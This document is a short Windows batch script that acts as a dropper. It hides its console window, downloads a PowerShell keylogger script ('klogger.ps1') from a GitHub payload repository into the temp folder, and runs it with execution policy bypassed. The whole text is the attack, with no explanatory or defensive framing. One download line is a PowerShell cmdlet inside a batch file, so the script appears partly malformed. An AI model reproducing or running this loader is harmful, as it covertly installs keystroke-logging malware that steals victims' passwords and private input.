@echo off
mode con:cols=30 lines=1
cd %temp%
Invoke-WebRequest -OutFile klogger.ps1 -Uri https://raw.githubusercontent.com/subhranshuchoudhury/Powershell_Payloads/main/3.%20Keylogger.ps1
powershell -executionpolicy bypass -File .\klogger.ps1

